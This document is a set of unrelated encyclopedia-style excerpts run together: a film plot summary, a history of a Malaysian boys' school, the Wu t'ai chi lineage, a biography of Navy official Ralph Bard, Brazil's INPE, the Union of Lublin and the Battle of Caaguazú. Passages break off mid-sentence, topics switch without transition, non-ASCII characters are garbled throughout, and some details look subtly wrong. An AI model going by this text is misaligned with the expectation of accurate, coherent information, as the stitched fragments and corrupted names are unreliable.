pinning his arm inside of his car window and sending it into traffic. In a haze, she locates Sarah at Elizabeth Arden and makes an impassioned plea for her help. Sarah tells Terry she would rather let Jack be killed than risk losing face. A disgusted Terry excoriates her and leaves. Sarah visits Terry at home, having had a change of heart, and gives her a contact, retrieved from her husbandthe Consul General. After transmitting the exit plan to Jack, Terry is captured by the KGB and learns that Talbot is a mole, who deceptively provided the contact for Jack, in reality a deadly trap. Terry escapes and flees to the bank to contact Jack. Talbot and his KGB henchmen are already there, masquerading as British bankers. Talbot orders her to tell Jack that nothing is wrong, but she tricks Talbot into sitting in an unstable chair, then fights him to reach her computer. Though one of Talbot's henchmen opens fire on the office, Terry continues typing a warning to Jack. When Carl, Talbot's other henchman, moves to kill her, he is suddenly shot by Marty. Terry bites Talbot's groin to free herself, then sends the warning to Jack. Marty reveals that he is Peter Caen, the CIA contact on the frying pan, then sends Jack a safe exit strategy. Terry waits at the restaurant where she and Jack plan to meet, but is despondent by the time Peter arrives, at closing, to say Jack was called away. The next morning, Terry's co-workers are excited that Mr. Page is being promoted and Terry will be taking over his position. Terry is still depressed, but receives a message on her terminal from Jack. Terry berates him, but when she slams her glasses down, Jack advises against it, and Terry realizes he can see her. She turns and sees Jack for the first time. He embraces her, then asks her to dinner. Her co-workers, including Mr. Page, greet Jack warmly, then the team applaudes the new couple as they leave. Cast In addition, a number of then current and future players from Saturday Night Live appeared in smaller roles, including Jon Lovitz, Phil Hartman (credited as Phil E. Hartmann), Jim Belushi and Michael McKean. Tracey Ullman appears in a cameo role, while the director‚Äôs daughter, Tracy Reiner, plays a secretary. Comedian Sam Kinison, who was dating director Penny Marshall at the time, was offered an unknown supporting role, but Whoopi Goldberg nixed the deal, causing Marshall and Kinison to break up their relationship and starting a bitter feud between Kinison and Goldberg. Production Production of the film, originally conceived as a vehicle for Shelley Long, was problematic. The script was troubled and often was rewritten on the set. It began with Howard Zieff as director, but he was replaced early in the production by Penny Marshall.Abramowitz, Rachel (2000). Is That a Gun in Your Pocket?

The morning session is for Form 1 to Form 5 students. This is so to accommodate the large number of students attending the school. The pupils are known as \\"BBians\\". It welcomes students from all races and religions. History The school was founded by Miss Mary Glasgow,Mary Glasgow - school founder who was the headmistress of Bukit Bintang Girls' School (BBGS) The municipal council, Majlis Perbandaran Petaling Jaya (MPPJ) (now named Majlis Bandaraya Petaling Jaya, MBPJ); allocated a piece of land to Glasgow for building a school for the community. Although the land was available, no money was provided to build it. Glasgow and the Bukit Bintang Girls' School students swung into action; raising money by holding fun fairs, food fairs and plays. Within a short time, the girls had raised enough to build the boys' school. Miss Yeoh Kim Eng (a retired teacher of BBGS) recounted the time when BBGS teachers and students, armed with buckets and bins, came to the newly built boys' school to wash and clean the building. At its establishment, The Malay Mail, a local daily, called it the brother school of Bukit Bintang Girls' School. After deliberation with teachers and advisers to name the new school, Glasgow named it Bukit Bintang Boys' Secondary School in connection to the girls' school Glasgow founded. As a young nation in 1957-58, the Malaysian government welcomed help from all quarters to build schools and to give its citizens an education. Christian missionaries such as Glasgow opened \\"Christian\\" schools in the early 1960s, usually in the rural areas. They either bought land or were granted land in outskirt areas (often rural, undeveloped areas) and were left to their own ingenuity to develop and build their schools. Although the schools were started by missionaries, the curriculum was based on government guidelines and was usually non-religious, although Bible studies were encouraged. Initially, classes were taught in English but has since changed to Bahasa Melayu in line with the government directives. Since 2003, Science and Mathematics are taught in English. The school's first Principal (known as the Headmaster) was Mr. Alastair L. McGregor (now Doctor) from Scotland. He served the school from 1958 to 1966. He was only a young man of 28 when he accepted the challenge to run a school halfway round the world from his home in Scotland, United Kingdom. In 1961, the secondary school was moved to its current location in Jalan Utara, Petaling Jaya; and at that time, each form (Form 1 to 5) consisted of only one class. A year later in 1962 - the year when the first group of students sat for the Cambridge Examination, the school's opening ceremony took place and McGregor was appointed the first headmaster. In 1976, a new science block was built at the cost of RM200,000.00. This block consists of three science laboratories and a lecture theatre. This block was named 'The Boler Block' in honour of Mr. David Boler, the headmaster at the time. Funds to build new wings were mostly raised by the students and teachers. Help was also given by certain Christian associations. In 2006, Bukit Bintang Girls' School moved to a new location in Cheras and did not retain its original name; it is now known as SMK Seri Bintang Utara. The Pavilion shopping centre was built over the old location. =50th Anniversary= 50th Anniversary T-shirt In 2008, the school celebrated its 50th anniversary (Golden Jubilee). Tan Sri Musa Hassan, Malaysia's Inspector- General of Police, a BB alumnus, was the guest of honour. A 50th anniversary T-shirt was released and sold by the school Co-operative.

The top left hand corner of the badge depicts hills which stands for 'Bukit' followed by the top right hand corner which shows a star which stands for 'Bintang', a Malay word meaning star. The bottom left hand corner indicates the national flower 'Bunga Raya' (Hibiscus) and thus represents 'Malaysia.' The design of a roof above the letters 'PJ' means that the school is situated in Petaling Jaya. The shape that resembles a gear below the letters 'PJ' symbolises that Petaling Jaya is an industrialised area. Mr. Boler redesigned the school tie by adding the design of the school badge onto the plain olive green tie. =School magazine= The school magazine is \\"The Bintang\\".

They have registered the group in 2012 under the name of BBBSS Alumni Association. Facilities New PBSM Room Renovated Science Lab I Renovated Science Lab II Teacher's Room with air-conditioners In 2007, the school Co-operative was formed, named \\"Koperasi Sekolah Menengah Kebangsaan Laki-laki Bukit Bintang Berhad\\". The original business centre was set up at the previous counselling room. In 2008, it was moved to the room behind the Canteen Area (earlier the Music Room). The shareholders of the Co- operative are students and teachers. The products sold are mostly stationery and books, but now have included buns and ice-cream. After the Government announced that free textbooks would be given to all students, the Co-operative took over the role of school bookshop. Co-operative signboard In 2008, the road from the main gate to the squash complex was tarred. A new Computer Laboratory was made in the same year, with 30 computers that were donated by the public. The Computer Lab had earlier occupied the Auditorium, now occupy the room which was formerly the Snooker Room. A new Teacher's Cafe, a lounge for Teachers, was unveiled on Graduation Day in August 2009, in the presence of Madam Sharon Kang, the main sponsor. A new wall was built around the Squash Complex. Towards the end of the school year, with contributions from an ex- BBian, a gymnasium was installed in one of the Squash Complex classes.

Students, teachers and parents raised funds over five years from 1981 to 1985. Fund-raising projects such as \\"Jog-a-thon\\", Canteen Day and School Fun Fair were conducted during the period. Upon its completion, it produced the largest squash court facilities in Petaling Jaya. The old canteen was used as a temporary classroom to accommodate the increasing number of students but was eventually demolished. The new double storey block housed a hall upstairs and canteen downstairs. The new school hall also doubled as badminton courts. The batch of students sitting for their 1985 SPM examinations took their examinations in the new hall. Members of the public can rent the squash courts and the badminton hall for their private usage.

This style is different from the Wu style of t'ai chi ch'uan (Ê≠¶Ê∞è) founded by Wu Yu-hsiang. While the names are distinct in pronunciation () and the Chinese characters used to write them are different, they are often romanized the same way. History Wu Quanyou was a military officer cadet of Manchu ancestry in the Yellow Banner camp (see Qing Dynasty Military) in the Forbidden City, Beijing and also a hereditary officer of the Imperial Guards Brigade. At that time, Yang Luchan was the martial arts instructor in the Imperial Guards, teaching t'ai chi ch'uan, and in 1850 Wu Ch'uan-yu became one of his students. In 1870, Wu Ch'uan-yu was asked to become the senior disciple of Yang Pan-hou, Yang Luchan's oldest adult son, and an instructor as well to the Manchu military. Wu Ch'uan-yu had three primary disciples: his son Wu Chien-ch'uan, Wang Mao Zhai and Guo Fen. Wu Ch'uan-yu's son, Wu Chien-ch'uan, and grandchildren: grandsons Wu Kung-i and Wu Kung-tsao as well as granddaughter Wu Ying-hua were well known teachers. Wu Chien-ch'uan became the most widely known teacher in his family, and is therefore considered the co-founder of the Wu style by his family and their students. He taught large numbers of people and his refinements to the art more clearly distinguish Wu style from Yang style training. Wu Chien-ch'uan moved his family south from Beijing (where an important school founded by other students of his father is headquartered, popularly known as the Northern Wu style) to Shanghai in 1928, where he founded the Chien-ch'uan T'ai Chi Ch'uan Association (ÈëëÊ≥âÂ§™Ê•µÊã≥Á§æ) in 1935. Wu Kung-i then moved the family headquarters to Hong Kong in 1948. His younger sister Wu Ying-hua and her husband, Ma Yueh-liang (Ma Yueliang, È¶¨Â≤≥Ê®ë, 1901-1999), stayed behind to manage the original Shanghai school. Between 1983 and her death in 1996 Wu Ying-hua was the highest-ranked instructor in the Wu family system. Her descendants continue teaching and today manage the Shanghai school as well as schools in Europe: * Ma Hai Long is the current head of the Shanghai Jianquan Taijiquan Association. * Ma Jiang Bao (1941-2016) lived in the Netherlands and taught traditional taijiquan throughout Europe. * Her granddaughter Dr Jin Ye lives and teaches in England. * Her adopted daughter Shi Mei Lin now lives and teaches Wu-style taijiquan in New Zealand, with students also in France and The United States. Wu Kung-i's children were also full-time martial art teachers: * His son Wu Ta-k'uei was active in the resistance to the Japanese invasion of China, yet he later taught t'ai chi ch'uan in Japan after the war. * His younger brother, Wu Ta- ch'i, supervised the family's Hong Kong and southeast Asian schools for many years and opened the family's first western hemisphere school in Toronto, Canada in 1974. * His daughter, Wu Yen-hsia, was known as an expert with the t'ai chi chien (sword). * His cousin, Wu Ta-hsin, was also known as a weapons specialist, particularly with the t'ai chi tao (sabre). = T'ai chi ch'uan lineage tree with Wu-style focus = Training The Wu style's distinctive hand form, pushing hands and weapons trainings emphasize parallel footwork and horse stance training with the feet relatively closer together than the modern Yang or Chen styles, small circle hand techniques (although large circle techniques are trained as well) and differs from the other t'ai chi family styles martially with Wu style's initial focus on grappling, throws (shuai chiao), tumbling, jumping, footsweeps, pressure point leverage and joint locks and breaks, which are trained in addition to more conventional t'ai chi sparring and fencing at advanced levels. Generational senior instructors of the Wu family t'ai chi ch'uan schools 1st Generation *Wu Ch'uan-yu (Quanyou, Âê≥ÂÖ®‰Ωë, 1834-1902), who learned from Yang Luchan and Yang Pan-hou, was senior instructor of the family from 1870‚Äì1902. 2nd generation *His oldest son, Wu Chien-ch'uan (Wu Jianquan, Âê≥ÈëëÊ≥â, 1870-1942), was senior from 1902‚Äì1942. 3rd Generation *His oldest son, Wu Kung-i (Wu Gongyi, Âê≥ÂÖ¨ÂÑÄ, 1900-1970) was senior from 1942‚Äì1970. *Wu Kung-i's younger brother, Wu Kung-tsao (Wu Gongzao, Âê≥ÂÖ¨Ëóª, 1903-1983), was senior from 1970‚Äì1983. *Wu Kung-i's younger sister, Wu Ying- hua (Wu Yinghua, Âê≥Ëã±ËèØ, 1907-1997), was senior from 1983‚Äì1997. 4th Generation *Wu Kung-i's daughter, Wu Yan-hsia (Wu Yanxia, Âê≥ÈõÅÈúû, 1930-2001) was senior from 1997‚Äì2001. *Wu Kung-tsao's son, Wu Ta-hsin (Wu Daxin, Âê≥Â§ßÊñ∞, 1933-2005), was senior from 2001‚Äì2005. 5th Generation *The current senior instructor of the Wu family is Wu Ta-kuei's son Wu Kuang-yu (Wu Guangyu, Eddie Wu, Âê≥ÂÖâÂÆá, born 1946).

Bard was active in civic organizations in the Chicago area, including Boy Scouts of America and the American Red Cross. He was also a trustee of Northwestern University.Who Was Who in America, v. 6 (1974-1976), Chicago: Marquis Who's Who, 1978, p. 20, col. 3.

Bard was appointed Assistant Secretary of the Navy by President Franklin D. Roosevelt, a Democrat who had once held the same post.Roosevelt was Assistant Secretary, 1913-1920, under President Woodrow Wilson. Roosevelt considered appointing his political adviser Thomas (\\"The Cork\\") Corcoran to the job, but decided on Bard based on the recommendation of Navy Secretary Frank Knox. See \\"Back-Seat Driver,\\" Time Magazine, February 24, 1941. Knox wanted to appoint Bard to the post of Under Secretary in 1940 after William J.

Townsend Hoopes and Douglas Brinkley, Driven Patriot: The Life and Times of James Forrestal, Naval Institute Press, 2000, p. 129. As Assistant Secretary, Bard was responsible for all matters relating to civilian personnel and the general administration of the Navy Department. Divisions under his control included Shore Establishments, Transportation, Supervision and Management, the Administrative Office, and the Management Engineer's Office. He instituted a sweeping industrial relations program, covering such areas as training, classification, safety, labor relations, recruiting, and efficient use of manpower, and established a Personnel Relations Division in every major naval activity. As a result of his efforts, there was no strike or work stoppage at any Navy activity during World War II. Bard was also a member of the War Manpower Commission, established by President Roosevelt to balance the wartime labor needs of the civilian and military sectors of the U.S. economy. Upon becoming Under Secretary on June 24, 1944, Bard added responsibility for all Navy uniformed personnel to his other duties.Biographical Note, Papers of Assistant Secretary of the Navy Ralph A.

When Bard became Assistant Secretary, Navy policy was to prohibit African Americans from enlisting for \\"general duty\\" (combat) roles, restricting them to service as \\"messmen.\\" Although Bard's duties as Assistant Secretary did not extend to uniformed personnel, his office often dealt with racial discrimination and its consequences. As a member of a committee appointed to investigate the Navy's racial policies, Bard's special assistant Addison Walker argued for allowing enlistment of a small number of African Americans for general duty on an experimental basis; and Bard himself promised Mark Abridge, who chaired President Roosevelt's Fair Employment Practices Committee, that enlistment of African Americans would be given consideration. Under pressure from President Roosevelt, the Navy announced in 1942 a new policy of accepting African American volunteers (but not draftees) for general duty positions in segregated units, a practice that continued until 1948 when President Truman issued Executive Order 9981 racially integrating the United States Armed Services.

Truman on the use of the atomic bomb.Notes of the Interim Committee Meeting, May 31, 1945, pp. 1-3. Although Bard joined in the committee's unanimous recommendation that the bomb should be used in combat as soon as possible and without warning,Notes of the Interim Committee Meeting, June 1, 1945, pp. 8-9. he developed second thoughts. In a memorandum dated June 27, 1945, to Secretary of War Henry L. Stimson,The memorandum was sent to Stimson through George L. Harrison, who acted as the Interim Committee's secretary. A facsimile copy of Bard's memorandum and of Harrison's covering memorandum to Stimson is found at The George Washington University. Bard argued that Japan should receive two or three days' \\"preliminary warning\\" before the bomb was used. \\"The position of the United States as a great humanitarian nation and the fair play attitude of our people generally is responsible in the main for this feeling,\\" Bard wrote, adding that he felt \\"that the Japanese government may be searching for some opportunity which they could use as a medium of surrender.\\" The memorandum also suggested that Japan be informed of \\"Russia's position,\\" i.e., the likely entry of the Soviet Union into the war, and that \\"assurances\\" be given \\"with regard to the Emperor of Japan and the treatment of the Japanese nation following unconditional surrender.\\"id. However, the extensive incendiary raids on Japanese cities under General Curtis LeMay that killed at least 350,000 civilians desensitized U.S. authorities, and the Japanese government did not respond to the Potsdam Declaration in late July 1945 outlining the conditions for unconditional surrender. On August 6, 1945, the first atomic bomb was dropped on the Japanese city of Hiroshima without the warning that Bard recommended, inflicting approximately 70,000 deaths, including 20,000 Japanese combatants and 20,000 Korean slave laborers. On August 8, the Soviet Union declared war on Japan and launched the invasion of Manchuria which decimated the already-weakening Manchukuo Imperial Army. On August 9, a second bomb was used on the Japanese city of Nagasaki, killing approximately 35,000 people, including 27,778 Japanese munitions employees, 2,000 Korean slave laborers, and 150 Japanese combatants. On August 15, the Emperor announced the surrender of Japan. Bard submitted his resignation as Under Secretary at about the time the Interim Committee made its recommendation to Truman on the use of the bomb. He left his post a month later. There is no evidence that he resigned in disagreement with the recommendation or because his own recommendations to Stimson were not followed.

While INPE is the civilian research center for aerospace activities, the Brazilian Air Force's General Command for Aerospace Technology is the military arm. INPE is located in the city of S√£o Jos√© dos Campos, S√£o Paulo. History On August 13, 1961, President J√¢nio Quadros signed a decree which created the Organizing Group for the National Commission on Space Activities (COGNAE). This group would give rise to the current National Institute for Space Research. COGNAE, which shortly after became known as CNAE, started its activities by stimulating, coordinating and supporting studies on space related areas, besides breeding a tam of skilled researchers and establishing cooperation with leading nations on the space area. On April 22, 1971, the National Institute for Space Research (INPE) was created, subordinated to the National Research Council (CNPq). Its first Director was the electronic engineer Fernando de Mendon√ßa. INPE would be the main civilian executive organ for space research development in accordance with the directives of the Brazilian Commission for Space Activities (COBAE), an advisory organ to the President. Until the mid-Seventies, the main projects carried out by INPE included the usage of meteorological, communications and earth observation satellites. This engendered other projects such as: *MESA - reception and interpretation of meteorological satellite images *SERE - use of satellite remote sensing technique and aircraft earth resources monitoring *SACI - improved the educational system through broadcasting, using a geostationary communications satellite INPE entered a new era when the Brazilian government approved the Complete Brazilian Space Mission (MECB) at the end of the 1970s. The institute, besides research and applications, started the development of the space technology for specific needs, essential for a country of continental dimensions with immense uninhabited areas. On March 15, 1985, the Ministry of Science and Technology (MCT) was created and INPE became part of it as an independent organ of the Direct Administration. During the 1980s, INPE started developing priority programs such as: *Complete Brazilian Space Mission (MECB) *China-Brazil Earth Resources Satellite program (CBERS) *Amazon Research Program (AMZ) *Center for Weather Forecast and Climatic Studies (CPTEC) It also kept track of other countries' research on the space area, facilitating collaboration and partnership with them. During this period it also established its Integration and Tests Laboratory (LIT) which develops highly specialized activities essential to the Brazilian Space Program. In the 1990s, the first Brazilian satellite (SCD-1) was launched. Since 1994, the Brazilian Space Agency has been responsible for Brazil's space program. INPE works in close cooperation with the agency. In 1998, the second Brazilian satellite (SCD-2) was successfully launched, performing even better than the first one. CBERS 1 was launched in 1999, CBERS 2 in 2003 and CBERS 2B in 2007. In August 2019, the chief of the agency, Ricardo Galv√£o, was fired by science minister Marcos Pontes after a period where Galv√£o had a public argument with Brazilian president Jair Bolsonaro over the validity of data from DETER, a satellite system monitoring deforestation. Bolsonaro stated that the data had been altered to attack his government and Galv√£o called him a coward in response.Brazilian institute head fired after clashing with nation‚Äôs president over deforestation data.

King Sigismund II Augustus holds the cross at the centre while surrounded by statesmen, diplomats, the clergy and nobles The Union of Lublin (; ) was signed on 1 July 1569, in Lublin, Poland, and created a single state, the Polish‚ÄìLithuanian Commonwealth, one of the largest countries in Europe at the time. It replaced the personal union of the Crown of the Kingdom of Poland and the Grand Duchy of Lithuania with a real union and an elective monarchy, since Sigismund II Augustus, the last of the Jagiellons, remained childless after three marriages. In addition, the autonomy of Royal Prussia was largely abandoned. The Duchy of Livonia, tied to Lithuania in real union since the Union of Grodno (1566), became a Polish‚ÄìLithuanian condominium. The Commonwealth was ruled by a single elected monarch who carried out the duties of King of Poland and Grand Duke of Lithuania, and governed with a common Senate and parliament (the Sejm). The Union was an evolutionary stage in the Polish‚ÄìLithuanian alliance and personal union, necessitated also by Lithuania's dangerous position in wars with Russia.Dvornik, Francis, The Slavs in European History and Civilization, Rutgers University Press, , Google Print, p.254Norman Davies, God's Playground: A History of Poland in Two Volumes, Oxford University Press, , Google Print, p.50W. H. Zawadzki, A Man of Honour: Adam Czartoryski as a Statesman of Russia and Poland, 1795‚Äì1831, Oxford University Press, 1993, , Google Print, p.1 Constituting a crucial event in the history of several nations, the Union of Lublin has been viewed quite differently by many historians. Sometimes identified as the moment at which the szlachta (including Lithuanians/Ruthenians) rose to the height of their power, establishing a democracy of noblemen as opposed to absolute monarchy. Some historians concentrate on its positive aspects, emphasizing its peaceful, voluntary creation, inclusive character and its role in spreading of economical welfare and good laws; others see there a possible cause of social and political instability that led to the Partitions of Poland about 200 years later. Some Lithuanian historians are more critical of the Union, due to it weakening the Grand Duchy of Lithuania in the midst of the Livonian War, with Sigismund II Augustus unilaterally ceding Podlachia and lands in Ukraine (Kiev Voivodeship, Brac≈Çaw Voivodeship, and Volhynian Voivodeship) to Poland, hence concluding it was an effect of the domination of Sigismund II Augustus by Polish nobles. History =Background= Poland and Lithuania in 1526, before the Union of Lublin The Polish-Lithuanian Commonwealth in 1569 There were long discussions before signing the union treaty. Lithuanian magnates were afraid of losing much of their powers, since the union would make their legal status equal to that of the much more numerous Polish lower nobility. Lithuania had been increasingly on the losing side of the Muscovite-Lithuanian Wars, however, and by the second half of the 16th century, it faced the threat of total defeat in the Livonian war and incorporation into Russia. The Polish nobility (the szlachta), on the other hand, were reluctant to offer more help to Lithuania without receiving anything in exchange (as much as 70% of the taxes collected in Poland in the 1560s went to support Lithuania in its war with Moscow). The Polish and Lithuanian elites strengthened personal bonds and had opportunities to plan their united futures during increased military cooperation.Norman Davies, God's Playground: A History of Poland in Two Volumes, Oxford University Press, p.151 Sigismund II Augustus, King of Poland and Grand Duke of Lithuania, seeing the threat to Lithuania and eventually to Poland, pressed for the union, gradually gaining more followers until he felt enough support to evict landowners forcibly who opposed the transition of territory from Lithuania to Poland.Norman Davies, God's Playground: A History of Poland in Two Volumes, Oxford University Press, p.153. Two Podlasian officers were deprived of their lands and offices. A clear motivation for Sigismund was that he was the last Jagiello and had no children or brothers who could inherit the throne. Therefore, the Union was an attempt to preserve the continuity of his dynasty's work since the personal (but not constitutional) union of Poland and Lithuania at the marriage of Jadwiga of Poland and Wladyslaw II Jagiello. The Union was one of the constitutional changes required to establish a formal elected monarchy, which would simultaneously reign over both domains. =Sejm of 1569= The Sejm met in January 1569, near the Polish town of Lublin, but did not reach an agreement. One of the points of contention was the right of Poles to settle and own land in the Grand Duchy. After most of the Lithuanian delegation under the leadership of Vilnius Voivodeship's Miko≈Çaj \\"Rudy\\" Radziwi≈Ç≈Ç left Lublin on 1 March, the king responded by annexing Podlachie, Volhynian, Brac≈Çaw, and the Kiev Voivodeships to the Crown (on 6 June), with wide approval from the local gentry. Those historic lands of Rus' are over half of modern Ukraine and were then a substantial portion of the Grand Duchy of Lithuania's territory. The Rus' nobles there were eager to capitalise on the economic and political opportunities offered by the Polish sphere, and by and large, they wanted their lands to become a part of the Polish Crown. The Lithuanians were forced to return to the Sejm under the leadership of Jan Hieronimowicz Chodkiewicz (father of Jan Karol Chodkiewicz) and to continue negotiations, using slightly different tactics from those of Radziwi≈Ç≈Ç. Though the Polish szlachta wanted full incorporation of the Grand Duchy of Lithuania into the Crown, the Lithuanians continued to oppose that and agreed only to a federal state. On 28 June 1569, the last objections were overcome, and on 4 July, an act was accordingly signed by the king at Lublin Castle. Attempts at modernisation The Union of Lublin was superseded by the Constitution of 3 May 1791, under which the federal Commonwealth was to be transformed into a unitary state by King Stanis≈Çaw August Poniatowski. The status of semi-federal state was restored by the Reciprocal Guarantee of Two Nations. The constitution was not fully implemented, however, and the Commonwealth was ended with the Partitions of Poland in 1795. Aftermath = Cultural = Eastern Catholic (Byzantine rite) in the east (orange color) Union of Lublin, by Marcello Bacciarelli After the Union, the Lithuanian nobles had the same formal rights as the Polish to rule the lands and subjects under their control. However, political advancement in the Catholic-dominated Commonwealth was a different matter. By the late 15th century, the Polish language was already making rapid inroads among the Lithuanian and Rus' elites. The Lublin Union accelerated the process of Polonization. In culture and social life, both the Polish language and Catholicism became dominant for the Ruthenian nobility, most of whom were initially Ruthenian-speaking and Eastern Orthodox by religion. However the commoners, especially the peasants, continued to speak their own languages and after the Union of Brest converted to Eastern Catholicism. This eventually created a significant rift between the lower social classes and the nobility in the Lithuanian and Ruthenian areas of the Commonwealth. Some Ruthenian magnates resisted Polonization (like the Ostrogskis) by adhering to Orthodox Christianity, giving generously to the Ruthenian Orthodox Churches and to the Ruthenian schools. However, the pressure of Polonization was harder to resist with each subsequent generation and eventually almost all of the Ruthenian nobility was Polonized. The Cossack uprisings and foreign interventions led to the partitions of the Commonwealth by Russia, Prussia and Austria in 1772, 1793, and 1795. The Union of Lublin was also temporarily inactive while the Union of Kƒódainiai was in effect. Many historians like Krzysztof Rak consider the Union of Lublin to have created a state similar to the present-day European Union, thus considering the Union (along with the Kalmar Union, the several Acts of Union in the British Isles and other similar treaties) to be a predecessor of the Maastricht Treaty. The former, however, created a state of countries more deeply linked than the present-day European Union. =Economic= The union brought about the Polish colonization of Ruthenian lands and increasing enserfment of Ruthenian peasantry by the szlachta.

The First Statute of Lithuania was also used in the territories of Lithuania that were annexed by Poland shortly before the Union of Lublin (except for Podlaskie). These conflicts between statutory schemes in Lithuania and Poland persisted for many years, and the Third Statute of Lithuania remained in force in territories of the Grand Duchy of Lithuania even after partitions, until 1840. Attempts to limit the power of Lithuanian magnates (especially the Sapieha family) and unify the laws of the Commonwealth led to the koekwacja praw movement, culminating in the koekwacja reforms of the Election Sejm of 1697 (May‚ÄìJune), confirmed in the General Sejm of 1698 (April) in the document PorzƒÖdek sƒÖdzenia spraw w Trybunale Wielkiego Ksiƒôstwa Litewskego.Jerzy Malec, Szkice z dziej√≥w federalizmu i my≈õli federalistycznych w czasach nowo≈ºytnych, \\"Unia Troista\\", Wydawnictwo UJ, 1999, Krak√≥w, , Part II, Chapter I Koewkwacja praw. =Military= Poland provided military aid in the wars after the union of the two entities, which was crucial for the survival of the Grand Duchy.

Though the countries were in theory equal, the larger Poland became the dominant partner. Due to population differences, Polish deputies outnumbered Lithuanians in the Sejm by 3:1. There was to be a single ruler for both Poland and the Grand Duchy, freely elected by the nobility of both nations, and crowned as King of Poland and Grand Duke of Lithuania in Wawel Cathedral, Krak√≥w. A common parliament, the Sejm, held its sessions in Warsaw; it had 114 deputies from the Polish lands and 48 from Lithuania. The Senate had 113 Polish and 27 Lithuanian senators. Poland and the Grand Duchy were to have a common foreign policy. Legacy Memory of the union lasted long. Painting commemorating Polish‚ÄìLithuanian union; circa 1861. The motto reads \\"Eternal union.\\" The Union of Lublin was Sigismund's greatest achievement and his greatest failure. Although it created one of the largest states in contemporary Europe, one that endured for over 200 years, Sigismund failed to push through the reforms that would have established a workable political system. He hoped to strengthen the monarchy with the support of the lesser nobility, and to balance the power of lesser nobility and magnates. However, while all the nobility in the Commonwealth was in theory equal under the law, the political power of the magnates was not weakened significantly, and in the end they could too often bribe or coerce their lesser brethren. In addition, the royal power continued to wane, and while the neighbouring states continued to evolve into strong, centralized absolute monarchies, the Commonwealth slid with its Golden Liberty into a political anarchy that eventually cost it its very existence. Today's Republic of Poland considers itself a successor to the Commonwealth,As stated, for instance, in the preamble of the 1997 Constitution of the Republic of Poland. whereas the pre-World War II Republic of Lithuania saw the creation of the Polish‚ÄìLithuanian Commonwealth mostly in a negative light.

Precedents Since 1839 Corrientes Province had rebelled against the Buenos Aires Province dictator Juan Manuel de Rosas. The conflicts between Corrientes and Buenos Aires were overshadowed by the terms requested by the contenders. Corrientes demanded the sanctioning of a new constitution, while Rosas accused the Corrientes government of being run by the Unitarian Party. The governor of Corrientes was a federal like Rosas, but the province was allied with the Unitarian generals Juan Lavalle and Jos√© Mar√≠a Paz. The real discussion was about the Customs House of the port of the city of Buenos Aires. They took the income from Customs duties and benefited from it, without giving due share to the other provinces, and having an open business policy that was ruining the local industries in the provinces. The provinces most affected by this policy were the ones with ports on the Paran√° River, but Santa Fe and Entre R√≠os were firmly allied with Buenos Aires; which made Corrientes fight alone on the defense of the \\"riverine federalism\\". In 1839, then-governor Genaro Ber√≥n de Astrada had rebelled against the city of Buenos Aires, but a quick attack from the forces of Entre Rios governor Echag√ºe, had defeated him at the battle of Pago Largo, having Ber√≥n de Astrada paid with his life for the rebellion. After a short-lived federal party government, brigadier Pedro Ferr√© was elected to succeed them. Ferr√© was a political enemy of Rosas since 1832, when Rosas had caused the failure of his opportunity to defeat the Unitarians trying to organize the constitution of the nation. Ferr√© had put his provincial army under the command of general Lavalle, but the latter had invaded Entre R√≠os and had taken the army to invade Buenos Aires, leaving the province defenseless. To make matters worse, he had been defeated and had to retreat to the northwest. Ferr√© put all the remaining resources of the province under General Jos√© Mar√≠a Paz, who had a long Unitarian history. Paz worked on organizing and training the new army, to put it in combat conditions. He was lucky that Echag√ºe did not attack until the year 1840, because Lavalle had taken Santa Fe for a few weeks. The battle After learning of the defeat of Lavalle at the Battle of Famaill√°, Echag√ºe marched to the north. Paz had increased the size of his army with fleeing soldiers from Lavalle's, and Ferr√© had signed an alliance with Santa Fe's governor, brigadier Juan Pablo L√≥pez. Echag√ºe stayed in the south of the province for several weeks, reaching the Corriente River and waiting for the opportunity to attack with an advantage. Paz did not give him that chance, and crossed the river at the Caaguaz√∫ pass. At the start of the battle, Echag√ºe had more than 5,000 men (1,000 of them infantry) and 12 artillery pieces, under the command of Colonel Servando G√≥mez and other experienced officers, but he did not have the best of his generals, brigadier Justo Jos√© de Urquiza. Paz's forces, of about 3,000 men were commanded by less-capable officers, with the only experienced officer, who had fought in the War of Independence, Colonel Indalecio Chenaut. Among the Corrientes army's officers they would distinguish themselves the future governors, lieutenant colonels Joaqu√≠n Madariaga and Benjam√≠n Virasoro. Paz awaited the attack in a seemingly weak position: his cavalry on the left flank retreated at the first attack by the forces commanded by G√≥mez, and were chased for a few kilometers. But as they were advancing, they were surrounding themselves by the Corriente River and a swamp, and being shot at from the riverside by the Corrientes' infantry. Upon reaching the end, they were met by the infantry and artillery concentrated together and was defeated. They had to retreat and along the way they were shot at again effectively by the enemy's infantry in both flanks. The Corrientes cavalry attacked on the right flank, under General Manuel Ram√≠rez, and defeated the demoralized and weakened forces he confronted. The chase of the Federal cavalry pushed Echag√ºe, who was close to being shot to death. His infantry, lacking cavalry's protection, had to retreat; but several leagues distant, tired and thirsty, they surrendered. The artillery under Colonel Juan Bautista Thorne was the only force that acquitted themselves on the Federal side, but they had to finally surrender as the infantry had. The Corrientes army had 53 dead, while the Entre Rios army lost 1,350 dead and 800 prisoners, plus all their artillery, supplies and infantry weapons. Consequences The battle of Caaguaz√∫ was the last and most brilliant victory of General Paz. Argentina's entire littoral was left open for the advance of Corrientes forces, which were now made stronger by the captured weaponry. Paz quickly advanced towards Entre R√≠os and took the city of Paran√°. Upon reaching Paran√°, the differences between Paz and Ferr√© became serious and Paz was left by himself, with control only of the prisoners of Caaguaz√∫. A little while later, Juan Pablo L√≥pez was defeated in Santa Fe, and was replaced by Echag√ºe. Paz attempted to retreat to the east, and join with his ally brigadier general Fructuoso Rivera; but the ex-prisoners he had as soldiers deserted and joined the forces of Urquiza coming from Buenos Aires. Paz arrived alone to Concepci√≥n del Uruguay, where he refused to be out under the orders of Rivera. In the meantime, el brigadier general Manuel Oribe a rival of Rivera, crossed the Paran√° River and advanced along Urquiza to the east, where he would defeat Rivera at the Battle of Arroyo Grande. That Federal victory signified the fall of all the opposition to Rosas in the whole country, including Corrientes. Two years later, the Madariaga brothers would revolt against Rosas again in Corrientes province, and would again put their army in general Paz's hands, but their final defeat in 1847 gave absolute control of the country to Buenos Aires governor, Rosas.

